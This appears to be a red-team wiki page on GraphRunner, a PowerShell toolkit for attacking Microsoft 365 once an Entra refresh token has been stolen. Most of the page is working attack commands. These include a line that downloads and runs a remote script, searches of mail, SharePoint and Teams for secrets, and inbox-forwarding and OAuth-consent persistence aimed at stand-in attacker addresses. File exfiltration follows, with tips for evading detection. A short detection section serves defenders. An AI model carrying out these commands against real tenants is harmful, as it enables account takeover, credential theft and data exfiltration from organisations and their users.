---
title: GraphRunner — MS Graph red-team toolkit
slug: graphrunner-msgraph-redteam
aliases: [graphrunner, msgraph-redteam]
---

> **TL;DR:** GraphRunner is a PowerShell toolkit that turns a stolen Entra refresh token into a full M365 attack chain — enumerate Graph, search mail/SharePoint/Teams/OneDrive for secrets, deploy persistence (mailbox rules, app consent, group additions), and exfiltrate. It assumes you've already grabbed a token (device-code phish, PRT cookie, FOCI swap) and gives you "what now?" tooling.

## Mental model

Microsoft Graph (`graph.microsoft.com`) is the unified API for all M365 (Exchange, Teams, SharePoint, OneDrive, Entra ID directory, Intune). With a user access token of the right scopes, you can do almost everything the user can — read mail, send mail-as, search Teams chats, list OneDrive files, enumerate groups, add app permissions, register a device. GraphRunner is the curated kit of these operations.

```
[refresh token] ── Get-GraphTokens ──► access token (with scopes)
        │
        ├── Invoke-GraphRecon         (tenant + user + role enumeration)
        ├── Invoke-DumpApps           (app registrations + perms)
        ├── Invoke-SearchMailbox      (regex through mail)
        ├── Invoke-SearchSharePointAndOneDrive
        ├── Invoke-SearchTeams        (chat content)
        ├── Invoke-InjectOAuthApp     (consent phishing)
        ├── Invoke-AddGroupMember     (lateral)
        └── Invoke-DriveFileDownload  (exfil)
```

## Preconditions

- A valid refresh or access token for the target user (most realistic entry path: [[entra-device-code-prt-pivot]] device-code phish + FOCI swap to Microsoft Office / MAB).
- Egress to `*.microsoft.com` / `*.microsoftonline.com`.
- For app-injection persistence: ability to convince the user (or admin) to consent — or a misconfigured tenant allowing user consent.

## Tradecraft

### Bootstrap

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1')

# Device code OR pass an existing refresh token
$tokens = Get-GraphTokens -RefreshToken $rt -ClientID d3590ed6-52b3-4102-aeff-aad2292ab01c
# d3590ed6 = Microsoft Office (FOCI member — see [[oauth-foci-family-of-client-ids-abuse]])
```

### Recon

```powershell
Invoke-GraphRecon -Tokens $tokens          # tenant, domains, users, roles, CA policies
Invoke-DumpCAPS  -Tokens $tokens           # all Conditional Access policies (read via beta endpoint)
Invoke-DumpApps  -Tokens $tokens           # service principals + delegated/app perms
Get-UpdatableGroups -Tokens $tokens        # groups the current user can add themselves to
Get-DynamicGroups   -Tokens $tokens        # dynamic-membership rules → impersonation paths
Get-SecurityGroups  -Tokens $tokens
```

`Invoke-GraphRecon` is the highest-signal first step — it dumps tenant settings most engagements never look at (user-can-consent, user-can-create-apps, default user role permissions) and finds the "small" misconfigs that lead to consent-phish persistence.

### Hunt secrets across services

```powershell
$terms = @("password","secret","apikey","conn string","BEGIN PRIVATE KEY","vpn")

Invoke-SearchMailbox             -Tokens $tokens -SearchTerm $terms -MessageCount 1000 -PageResults
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm $terms -ResultSize 100 -ResultCount 50
Invoke-SearchTeams                -Tokens $tokens -SearchTerm $terms
Invoke-SearchUserAttributes       -Tokens $tokens -SearchTerm $terms      # custom user props often hold helpdesk creds
```

Search uses `/v1.0/search/query` (Microsoft Search KQL) — same backend as the M365 web search bar, so it finds anything indexed.

### Persistence

```powershell
# Mailbox rule: forward + delete (classic)
Invoke-NewInboxRule -Tokens $tokens -RuleName "Sync" -ForwardTo attacker@x.tld -DeleteMessage

# OAuth app consent phish — register an app with selected scopes, host consent URL
Invoke-InjectOAuthApp -Tokens $tokens -AppName "Backup-Tool" -ReplyUrl "https://attacker.tld/cb" \
  -Scope "Mail.ReadWrite,Files.ReadWrite.All,User.Read"

# Lateral — add self to a discovered "Updatable" group
Invoke-AddGroupMember -Tokens $tokens -GroupId <id> -UserId <self-id>
```

### Exfil

```powershell
Invoke-DriveFileDownload -Tokens $tokens -ListFiles
Invoke-DriveFileDownload -Tokens $tokens -FileId <id> -OutputPath .\loot\
Invoke-ImmediateMeetingExfil -Tokens $tokens -Recipient attacker@x.tld   # send calendar invite with files
```

## Adjacent tooling

- **`AADInternals`** — defender-friendly auth library, complements GraphRunner with classic Azure AD / synthetic identity tricks (Pass-Through Auth backdoor, hybrid SSO seed key).
- **`MFASweep`** (dafthack) — finds endpoints that skip MFA.
- **`Halo` / `Maester`** — Microsoft-side defensive tooling that *generates* the audit logs GraphRunner triggers, useful to know exists.
- **`TokenTactics(V2)`** — pure token-juggling; pair with GraphRunner for the post-token actions.

## Detection / Telemetry

- **Entra audit logs** — `Add member to group`, `Add app role assignment grant to user`, `Consent to application` are first-class events. Splunk/Sentinel rules off `OperationName` catch most persistence calls.
- **Unified Audit Log (UAL)** — `Search-UnifiedAuditLog -Operations Search,New-InboxRule,Update-InboxRule,Add-MailboxPermission`. GraphRunner's mailbox rule fires `New-InboxRule` with `ForwardTo` set to an external address (M365 native alert "Suspicious inbox forwarding").
- **`/search/query` volume** — a single user firing dozens of cross-service search queries in minutes is anomalous; UAL `SearchQueryPerformed` events are throttled but visible.
- **Defender for Cloud Apps (Defender for Cloud Apps / "MCAS")** — anomaly detection "Unusual file download (by user)", "Multiple failed login attempts" (post-revocation retries), "Mass download".
- **GraphRunner uses Microsoft Office client ID** by default; sign-in logs show `Microsoft Office` from a foreign IP/UA — the "impossible travel" + "unfamiliar sign-in properties" risk events fire.

## OPSEC pitfalls

- Default scopes on the Office client include `Mail.ReadWrite`, `Files.ReadWrite.All`, `Sites.Read.All` — plenty for search/exfil, but **not** `Application.ReadWrite.All` (needed for app injection). To inject an OAuth app you need to FOCI-swap to a client that requested it, or the user must be Cloud Application Administrator.
- `Invoke-InjectOAuthApp` requires user consent by default. Some tenants block user consent entirely (`policies/authorizationPolicy → userConsentForApps = "ManagedByMicrosoft"`) — GraphRunner returns "consent required by admin" and bails.
- Mailbox forwarding rules to external addresses are blocked by default in modern M365 tenants (transport rule "External email forwarding"). Set the forward to an *internal* compromised inbox you've also gained access to.
- Every Graph call from GraphRunner uses the same `User-Agent: GraphRunner` string by default. Override (`$tokens.Headers["User-Agent"] = "Mozilla/..."`) or fork.
- A revoked refresh token kills all subsequent calls — but **access tokens you already have stay live**. Stockpile per resource (Graph, Exchange, SharePoint, Teams) before doing noisy actions.

## References

- https://github.com/dafthack/GraphRunner
- https://www.blackhillsinfosec.com/introducing-graphrunner/
- https://github.com/dafthack/MFASweep
- https://github.com/Gerenios/AADInternals
- https://learn.microsoft.com/en-us/graph/overview

See also: [[oauth-foci-family-of-client-ids-abuse]], [[entra-prt-cookie-theft]], [[entra-device-code-prt-pivot]], [[az-cli-tokens]], [[conditional-access-bypass-modern]], [[entra-conditional-access-bypass]], [[m365-admin-attacks]], [[app-registration-abuse]], [[oauth-modern-attacks]]
